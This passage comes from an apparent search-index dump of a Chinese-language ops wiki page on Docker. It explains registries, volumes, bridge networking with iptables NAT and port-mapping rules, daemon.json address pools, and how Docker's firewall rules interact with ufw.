<p>\u200b\u9664\u4e86\u200b Docker Hub \u200b\u4ee5\u5916\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b registry \u200b\u670d\u52a1\u200b\u662f\u200b GitHub Container Registry (ghcr)\u3002\u200b\u5b83\u200b\u4e0e\u200b GitHub \u200b\u7684\u200b\u5176\u4ed6\u200b\u529f\u80fd\u200b\uff0c\u200b\u5982\u200b Actions \u200b\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u96c6\u6210\u200b\uff08\u200b\u4f8b\u5982\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>${{ secrets.GITHUB_TOKEN }}</code> \u200b\u6765\u200b\u767b\u5f55\u200b\u5230\u200b ghcr\uff09\u3002\u200b\u8c37\u6b4c\u200b\u548c\u200b\u7ea2\u5e3d\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b registry \u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"ops/virtualization/container/#volume","title":"Volume","text":"<p>Volume \u200b\u662f\u200b Docker \u200b\u63d0\u4f9b\u200b\u7684\u200b\u4e00\u79cd\u200b\u6301\u4e45\u200b\u5316\u200b\u5b58\u50a8\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3001\u200b\u914d\u7f6e\u200b\u7b49\u200b\u3002 \u200b\u4e0a\u9762\u200b\u4ecb\u7ecd\u200b\u4e86\u200b\u4f7f\u7528\u200b <code>-v HOST_PATH:CONTAINER_PATH</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u6302\u8f7d\u200b\u5bbf\u4e3b\u673a\u200b\u7684\u200b\u76ee\u5f55\u200b\uff08\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b bind mount\uff09\uff0c\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u5c06\u200b\u53c2\u6570\u200b\u5199\u6210\u200b <code>-v VOLUME_NAME:CONTAINER_PATH</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b Docker \u200b\u5c31\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u4ee5\u6b64\u200b\u547d\u540d\u200b\u7684\u200b volume\uff0c\u200b\u5e76\u4e14\u200b\u5c06\u200b\u5176\u200b\u6302\u8f7d\u200b\u5230\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u3002</p> <pre><code>$ sudo docker run -it --rm -v myvolume:/myvolume ustclug/debian:12\nroot@c273ee70fe7a:/# touch /myvolume/a\nroot@c273ee70fe7a:/# ls /myvolume/\na\n</code></pre> <p>Volume \u200b\u5728\u200b\u8fd9\u91cc\u200b\u4e0d\u4f1a\u200b\u56e0\u4e3a\u200b\u5bb9\u5668\u200b\u9500\u6bc1\u200b\u88ab\u200b\u5220\u9664\u200b\uff1a</p> <pre><code>root@c273ee70fe7a:/# ^D\n$ # \u200b\u539f\u6765\u200b\u7684\u200b\u5bb9\u5668\u200b\u6ca1\u200b\u4e86\u200b\uff0c\u200b\u6302\u8f7d\u200b\u76f8\u540c\u200b\u7684\u200b volume \u200b\u5f00\u4e2a\u200b\u65b0\u200b\u7684\u200b\n$ sudo docker run -it --rm -v myvolume:/myvolume ustclug/debian:12\nroot@38e2da3a59f7:/# ls /myvolume/\na\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b Docker \u200b\u7ba1\u7406\u200b\u7684\u200b\u6240\u6709\u200b volume\uff0c\u200b\u5b83\u4eec\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u9645\u200b\u4f4d\u7f6e\u200b\uff1a</p> <pre><code>$ sudo docker volume ls\nDRIVER    VOLUME NAME\nlocal     2aa17ad1c2ee9bf3b2933d241a5196bdaff5e144abcfbf4c1d161198f0f35912\n\uff08\u200b\u7701\u7565\u200b\uff09\nlocal     myvolume\n\uff08\u200b\u7701\u7565\u200b\uff09\n$ sudo docker inspect myvolume\n[\n    {\n        \"CreatedAt\": \"2024-04-14T22:54:12+08:00\",\n        \"Driver\": \"local\",\n        \"Labels\": null,\n        \"Mountpoint\": \"/var/lib/docker/volumes/myvolume/_data\",\n        \"Name\": \"myvolume\",\n        \"Options\": null,\n        \"Scope\": \"local\"\n    }\n]\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u4e0a\u9762\u200b\u5217\u51fa\u200b\u7684\u200b volume \u200b\u91cc\u9762\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e9b\u200b\u6ca1\u6709\u200b\u540d\u5b57\u200b\uff0c\u200b\u663e\u793a\u200b\u4e3a\u200b\u54c8\u5e0c\u200b\u503c\u200b\u7684\u200b volume\u3002\u200b\u8fd9\u4e9b\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300c\u200b\u533f\u540d\u200b volume\u300d\u3002 \u200b\u4f8b\u5982\u200b\uff0c\u200b\u5982\u679c\u200b\u5728\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u200b\u6307\u5b9a\u200b volume \u200b\u540d\u5b57\u200b\uff0c\u200b\u90a3\u4e48\u200b Docker \u200b\u5c31\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b volume\uff1a</p> <pre><code>$ sudo docker run -it --rm --name test -v /myvolume ustclug/debian:12\nroot@ec434eb92714:/# # \u200b\u6253\u5f00\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7ec8\u7aef\u200b\n$ sudo docker inspect test\n\uff08\u200b\u7701\u7565\u200b\uff09\n        \"Mounts\": [\n            {\n                \"Type\": \"volume\",\n                \"Name\": \"e97304e5a0d8a981b4f0c62b776f6fcaed8d8a6a7263d8e8b7b2f1ea60018976\",\n                \"Source\": \"/var/lib/docker/volumes/e97304e5a0d8a981b4f0c62b776f6fcaed8d8a6a7263d8e8b7b2f1ea60018976/_data\",\n                \"Destination\": \"/myvolume\",\n                \"Driver\": \"local\",\n                \"Mode\": \"\",\n                \"RW\": true,\n                \"Propagation\": \"\"\n            }\n        ],\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5728\u200b <code>docker run</code> \u200b\u65f6\u200b\u6dfb\u52a0\u200b\u4e86\u200b <code>--rm</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u533f\u540d\u200b volume \u200b\u4f1a\u200b\u5728\u200b\u5bb9\u5668\u200b\u9500\u6bc1\u200b\u65f6\u200b\u88ab\u200b\u5220\u9664\u200b\u3002 \u200b\u53cd\u4e4b\u200b\uff0c\u200b\u624b\u52a8\u200b <code>docker rm</code> \u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u5bf9\u5e94\u200b\u7684\u200b\u533f\u540d\u200b volume \u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5220\u9664\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b\uff0cDockerfile \u200b\u4e2d\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>VOLUME</code> \u200b\u6307\u4ee4\u200b\u58f0\u660e\u200b volume\u3002\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u5728\u200b\u8fd0\u884c\u200b\u5bb9\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\u6ca1\u6709\u200b\u6307\u5b9a\u200b volume\uff0c\u200b\u90a3\u4e48\u200b Docker \u200b\u5c31\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b volume\u3002 \u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u662f\u200b <code>mariadb</code> \u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\uff1a</p> <pre><code>VOLUME [/var/lib/mysql]  # Layer 18\n</code></pre>"},{"location":"ops/virtualization/container/#docker-network","title":"\u7f51\u7edc","text":"<p>Docker \u200b\u7684\u200b\u7f51\u7edc\u200b\u9694\u79bb\u200b\u57fa\u4e8e\u200b Linux \u200b\u7684\u200b\u7f51\u7edc\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7b49\u200b\u7279\u6027\u200b\u3002 \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cDocker \u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e09\u79cd\u200b\u7f51\u7edc\u200b\uff1a</p> <pre><code>$ sudo docker network ls\nNETWORK ID     NAME                   DRIVER    SCOPE\n47bf1753e571   bridge                 bridge    local\na490cc0dc175   host                   host      local\n4ad7868e3a47   none                   null      local\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>bridge</code> \u200b\u4e3a\u200b\u5bb9\u5668\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0c<code>host</code> \u200b\u4e3a\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u5bbf\u4e3b\u673a\u200b\u5171\u4eab\u200b\u7f51\u7edc\u200b\uff0c<code>none</code> \u200b\u5219\u200b\u662f\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u7f51\u7edc\u200b\uff08\u200b\u53ea\u200b\u4fdd\u7559\u200b\u672c\u5730\u200b\u56de\u73af\u200b\uff09\u3002 \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--network</code> \u200b\u53c2\u6570\u200b\u6307\u5b9a\u200b\u5bb9\u5668\u200b\u4f7f\u7528\u200b\u7684\u200b\u7f51\u7edc\u200b\u3002</p>"},{"location":"ops/virtualization/container/#docker-bridge","title":"Bridge \u200b\u4ecb\u7ecd","text":"<p>\u200b\u5728\u200b\u8ba1\u7b97\u673a\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u7f51\u6865\u200b\uff08bridge\uff09\u200b\u8d1f\u8d23\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u5728\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u8fc7\u6ee4\u200b\u4e0e\u200b\u8f6c\u53d1\u200b\u6570\u636e\u5305\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002 \u200b\u800c\u200b\u5728\u200b Docker \u200b\u4e2d\u200b\uff0cbridge \u200b\u7f51\u7edc\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b\u8fde\u63a5\u200b\u5bb9\u5668\u200b\u7f51\u7edc\u200b\u548c\u200b\u4e3b\u673a\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6865\u200b\u3002 \u200b\u8fde\u63a5\u200b\u5230\u200b\u76f8\u540c\u200b bridge \u200b\u7684\u200b\u5bb9\u5668\u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u901a\u4fe1\u200b\u3002</p> <p>bridge \u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u7684\u200b\u5b9e\u73b0\u200b</p> <p>\u200b\u9996\u5148\u200b\uff0cDocker \u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u7684\u200b <code>docker0</code> \u200b\u7f51\u7edc\u8bbe\u5907\u200b\u4f5c\u4e3a\u200b\u7f51\u6865\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u5907\u200b\u9ed8\u8ba4\u200b\u5bf9\u5e94\u200b\u4e86\u200b IP \u200b\u6bb5\u200b <code>172.17.0.1/16</code>\uff0c \u200b\u521b\u5efa\u200b\u7684\u200b\u5bb9\u5668\u200b\u4f1a\u200b\u88ab\u200b\u5206\u914d\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u7f51\u6bb5\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b IP \u200b\u5730\u5740\u200b\u3002\u200b\u8def\u7531\u8868\u200b\u4e5f\u200b\u4f1a\u200b\u5c06\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u7f51\u6bb5\u200b\u7684\u200b\u8bf7\u6c42\u200b\u8f6c\u53d1\u200b\u5230\u200b <code>docker0</code> \u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff1a</p> <pre><code>$ ip a show docker0\n20: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:e0:cb:d8:81 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.0.255 scope global docker0\n        valid_lft forever preferred_lft forever\n    inet6 fe80::42:e0ff:fecb:d881/64 scope link proto kernel_ll \n        valid_lft forever preferred_lft forever\n$ ip route get 172.17.0.2\n172.17.0.2 dev docker0 src 172.17.0.1 uid 1000 \n    cache\n</code></pre> <p>\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u7f51\u7edc\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u521b\u5efa\u200b\u4e86\u200b\u5bb9\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u589e\u52a0\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u6570\u91cf\u200b\u7684\u200b <code>veth</code>\uff08\u200b\u865a\u62df\u200b\u4ee5\u592a\u7f51\u200b\uff09\u200b\u8bbe\u5907\u200b\uff1a</p> <pre><code>$ # \u200b\u5f00\u542f\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u5bb9\u5668\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\n$ ip a\n\uff08\u200b\u7701\u7565\u200b\uff09\n7: veth5669cd1@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default \n    link/ether 96:2b:10:03:cc:36 brd ff:ff:ff:ff:ff:ff link-netnsid 1\n    inet6 fe80::942b:10ff:fe03:cc36/64 scope link \n        valid_lft forever preferred_lft forever\n9: veth9219d7b@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default \n    link/ether d2:b8:23:74:49:2a brd ff:ff:ff:ff:ff:ff link-netnsid 2\n    inet6 fe80::d0b8:23ff:fe74:492a/64 scope link \n        valid_lft forever preferred_lft forever\n</code></pre> <p><code>veth</code> \u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b\u4e00\u6839\u200b\u865a\u62df\u200b\u7684\u200b\u7f51\u7ebf\u200b\uff0c\u200b\u4e00\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b\u5bb9\u5668\u200b\u5185\u90e8\u200b\uff08\u200b\u5bb9\u5668\u200b\u5185\u90e8\u200b\u5b89\u88c5\u200b <code>iproute2</code> \u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b <code>ip a</code> \u200b\u770b\u5230\u200b eth0 \u200b\u8fd9\u4e2a\u200b\u8bbe\u5907\u200b\uff09\uff0c\u200b\u53e6\u4e00\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b <code>docker0</code> \u200b\u7f51\u6865\u200b\u3002 \u200b\u4f46\u662f\u200b\u4ec5\u4ec5\u200b\u6709\u200b\u8bbe\u5907\u200b\u662f\u200b\u4e0d\u591f\u200b\u7684\u200b\uff0cDocker \u200b\u8fd8\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b\u4e3b\u673a\u200b\u7684\u200b iptables \u200b\u89c4\u5219\u200b\uff0c\u200b\u5426\u5219\u200b\u5c3d\u7ba1\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u4e3b\u673a\u200b\u4e4b\u95f4\u200b\u80fd\u591f\u200b\u6b63\u5e38\u200b\u901a\u4fe1\u200b\uff0c\u200b\u5bb9\u5668\u200b\u65e0\u6cd5\u200b\u901a\u8fc7\u200b\u4e3b\u673a\u200b\u8bbf\u95ee\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u3002 \u200b\u6362\u53e5\u8bdd\u200b\u8bb2\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u4e3b\u673a\u200b\u4e3a\u200b\u5bb9\u5668\u200b\u626e\u6f14\u200b\u300c\u200b\u8def\u7531\u5668\u200b\u300d\u200b\u7684\u200b\u89d2\u8272\u200b\u8fdb\u884c\u200b NAT\u3002</p> <p>\u200b\u67e5\u770b\u200b iptables \u200b\u7684\u200b <code>nat</code> \u200b\u8868\u200b\uff1a</p> <pre><code>$ sudo iptables -t nat -S\n-P PREROUTING ACCEPT\n-P INPUT ACCEPT\n-P OUTPUT ACCEPT\n-P POSTROUTING ACCEPT\n-N DOCKER\n-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER\n-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER\n-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n-A DOCKER -i docker0 -j RETURN\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u5bb9\u5668\u200b\u8bbf\u95ee\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u7684\u200b\u6570\u636e\u5305\u200b\uff0c\u200b\u4f1a\u200b\u7ecf\u8fc7\u200b <code>POSTROUTING</code> \u200b\u94fe\u200b\u7684\u200b <code>MASQUERADE</code> \u200b\u89c4\u5219\u200b\uff0c\u200b\u5c06\u200b\u6e90\u5730\u5740\u200b\u66ff\u6362\u200b\u4e3a\u200b\u4e3b\u673a\u200b\u7684\u200b\u5730\u5740\u200b\u3002 \u200b\u540c\u65f6\u200b\uff0cDocker \u200b\u4e5f\u200b\u4f1a\u200b\u63a7\u5236\u200b iptables \u200b\u5904\u7406\u200b\u7aef\u53e3\u6620\u5c04\u200b\u7b49\u200b\u89c4\u5219\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u542f\u52a8\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\uff1a</p> <pre><code>sudo docker run -it --rm -p 8080:80 nginx\n</code></pre> <p>\u200b\u90a3\u4e48\u200b <code>DOCKER</code> \u200b\u548c\u200b <code>POSTROUTING</code> \u200b\u94fe\u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>$ sudo iptables -t nat -S\n-P PREROUTING ACCEPT\n-P INPUT ACCEPT\n-P OUTPUT ACCEPT\n-P POSTROUTING ACCEPT\n-N DOCKER\n-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER\n-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER\n-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n-A POSTROUTING -s 172.17.0.4/32 -d 172.17.0.4/32 -p tcp -m tcp --dport 80 -j MASQUERADE\n-A DOCKER -i docker0 -j RETURN\n-A DOCKER ! -i docker0 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.17.0.4:80\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u5916\u90e8\u200b\u5230\u200b\u672c\u673a\u200b\u7684\u200b\u8bbf\u95ee\u200b\uff0c<code>PREROUTING</code> \u200b\u94fe\u200b\u5728\u200b\u8df3\u8f6c\u200b\u5230\u200b <code>DOCKER</code> \u200b\u94fe\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u672a\u200b\u8fdb\u5165\u200b <code>docker0</code> \u200b\u7684\u200b TCP \u200b\u6570\u636e\u5305\u200b\uff0c\u200b\u4f1a\u200b\u6839\u636e\u200b <code>DNAT</code> \u200b\u89c4\u5219\u200b\u5c06\u200b\u7aef\u53e3\u200b <code>8080</code> \u200b\u7684\u200b\u6570\u636e\u5305\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4fee\u6539\u200b\u4e3a\u200b\u5230\u200b\u8be5\u200b\u5bb9\u5668\u200b\u5185\u90e8\u200b\u7684\u200b <code>80</code> \u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5230\u200b\u672c\u5730\u200b\u56de\u73af\u200b 8080 \u200b\u7aef\u53e3\u200b\u7684\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4f1a\u200b\u7531\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b <code>docker-proxy</code> \u200b\u7a0b\u5e8f\u200b\u8d1f\u8d23\u200b\u300c\u200b\u8f6c\u53d1\u200b\u300d\u200b\u5230\u200b\u5bb9\u5668\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e0a\u200b\u3002 \u200b\u5bf9\u200b\u8be5\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b https://github.com/moby/moby/issues/11185\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>docker network create</code> \u200b\u521b\u5efa\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f51\u7edc\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u65b0\u200b\u7684\u200b bridge \u200b\u7c7b\u578b\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0c\u200b\u5728\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u4e5f\u200b\u4f1a\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u4ee5\u200b <code>br-</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u7f51\u6865\u200b\u8bbe\u5907\u200b\u3002\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b docker compose \u200b\u7ba1\u7406\u200b\u5bb9\u5668\u200b\u670d\u52a1\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u200b\u4e5f\u200b\u4f1a\u200b\u4e3a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b bridge \u200b\u7c7b\u578b\u200b\u7684\u200b\u7f51\u7edc\u200b\u3002\u200b\u6709\u5173\u200b\u7528\u6237\u200b\u521b\u5efa\u200b\u7684\u200b bridge \u200b\u7f51\u7edc\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u9ed8\u8ba4\u200b\u7f51\u7edc\u200b\u7684\u200b\u4f18\u52bf\u200b\uff08\u200b\u4f8b\u5982\u200b\u540c\u200b\u7f51\u7edc\u200b\u5bb9\u5668\u200b\u95f4\u200b\u81ea\u52a8\u200b\u7684\u200b DNS \u200b\u89e3\u6790\u200b\u652f\u6301\u200b\uff09\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b\uff1aBridge network driver\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cDocker \u200b\u521b\u5efa\u200b\u7684\u200b\u7f51\u7edc\u200b\u4f1a\u200b\u5206\u914d\u200b\u5f88\u5927\u200b\u7684\u200b IP \u200b\u6bb5\u200b\u3002 \u200b\u5728\u200b\u521b\u5efa\u200b\u4e86\u200b\u5f88\u591a\u200b\u7f51\u7edc\u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u5185\u200b\u7f51\u200b IP \u200b\u5730\u5740\u200b\u90fd\u200b\u88ab\u200b Docker \u200b\u5360\u7528\u200b\u4e86\u200b\u3002\u200b\u6211\u4eec\u200b\u5efa\u8bae\u200b\u4fee\u6539\u200b <code>/etc/docker/daemon.json</code>\uff0c\u200b\u5c06\u200b <code>default-address-pools</code> \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u8f83\u200b\u5c0f\u200b\u7684\u200b IP \u200b\u6bb5\u200b\uff1a</p> <pre><code>{\n    \"default-address-pools\": [\n        {\n            \"base\": \"172.17.1.0/24\",\n            \"size\": 28\n        },\n        {\n            \"base\": \"172.17.2.0/23\",\n            \"size\": 28\n        }\n    ],\n}\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u9ed8\u8ba4\u200b <code>docker0</code> \u200b\u7684\u200b\u5730\u5740\u200b\u6bb5\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>bip</code> \u200b\u9009\u9879\u200b\uff1a</p> <pre><code>{\n    \"bip\": \"172.17.0.1/24\"\n}\n</code></pre>"},{"location":"ops/virtualization/container/#docker-firewall","title":"\u9632\u706b\u5899\u200b\u914d\u7f6e","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\uff0c\u200b\u9632\u706b\u5899\u200b\u529f\u80fd\u200b\u4e00\u822c\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u662f\u200b\u5728\u200b iptables \u200b\u7684\u200b filter \u200b\u8868\u4e2d\u200b\u6dfb\u52a0\u200b\u89c4\u5219\u200b\u3002 \u200b\u800c\u200b\u7531\u4e8e\u200b Docker \u200b\u81ea\u8eab\u200b\u652f\u6301\u200b\u4e3a\u200b\u5bb9\u5668\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e5f\u200b\u9700\u8981\u200b\u64cd\u4f5c\u200b filter \u200b\u8868\u6765\u200b\u4fdd\u8bc1\u200b\u5bb9\u5668\u200b\u4e4b\u95f4\u200b\u7684\u200b\u7f51\u7edc\u200b\u9694\u79bb\u200b\u3002 Docker \u200b\u4f1a\u200b\u5728\u200b filter \u200b\u8868\u200b\u7684\u200b <code>FORWARD</code> \u200b\u94fe\u4e2d\u200b\u6dfb\u52a0\u200b\u8fd9\u6837\u200b\u7684\u200b\u89c4\u5219\u200b\uff1a</p> <pre><code>-A FORWARD -j DOCKER-USER\n-A FORWARD -j DOCKER-ISOLATION-STAGE-1\n-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\n-A FORWARD -o docker0 -j DOCKER\n-A FORWARD -i docker0 ! -o docker0 -j ACCEPT\n-A FORWARD -i docker0 -o docker0 -j ACCEPT\n</code></pre> <p>\u200b\u8fd9\u4e9b\u200b\u89c4\u5219\u200b\u5728\u200b <code>FORWARD</code> \u200b\u94fe\u200b\u6700\u200b\u524d\u9762\u200b\u2014\u2014\u200b\u5373\u4f7f\u200b\u81ea\u884c\u6dfb\u52a0\u200b\u4e86\u200b\u89c4\u5219\u200b\uff0cDocker \u200b\u670d\u52a1\u200b\u91cd\u542f\u200b\u4e4b\u540e\u200b\u5b83\u200b\u4e5f\u200b\u4f1a\u200b\u5728\u200b\u6700\u200b\u524d\u9762\u200b\u91cd\u65b0\u200b\u6dfb\u52a0\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b <code>DOCKER-USER</code> \u200b\u94fe\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u81ea\u5b9a\u4e49\u200b\u89c4\u5219\u200b\uff0c\u200b\u5176\u4ed6\u200b\u4ee5\u200b <code>DOCKER</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u94fe\u200b\u5219\u200b\u7531\u200b Docker \u200b\u81ea\u884c\u200b\u7ba1\u7406\u200b\u3002 \u200b\u5728\u200b\u6709\u200b\u7aef\u53e3\u6620\u5c04\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c<code>DOCKER</code> \u200b\u94fe\u4f1a\u200b\u76f4\u63a5\u200b\u5141\u8bb8\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6570\u636e\u5305\u200b\uff0c\u200b\u4e0d\u200b\u7ecf\u8fc7\u200b\u4e4b\u540e\u200b\u7684\u200b\u89c4\u5219\u200b\uff1a</p> <pre><code>-A DOCKER -d 172.17.0.4/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j ACCEPT\n</code></pre> <p>\u200b\u800c\u200b\u4f8b\u5982\u200b\u5728\u200b Ubuntu/Debian \u200b\u4e0a\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b ufw \u200b\u5de5\u5177\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u89c4\u5219\u200b\u4f1a\u200b\u5728\u200b Docker \u200b\u7684\u200b\u89c4\u5219\u200b\u540e\u9762\u200b\u3002 \u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>-A FORWARD -j DOCKER-USER\n-A FORWARD -j DOCKER-ISOLATION-STAGE-1\n-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\n-A FORWARD -o docker0 -j DOCKER\n-A FORWARD -i docker0 ! -o docker0 -j ACCEPT\n-A FORWARD -i docker0 -o docker0 -j ACCEPT\n-A FORWARD -o br-3e32bdc5bc2a -m conntrack 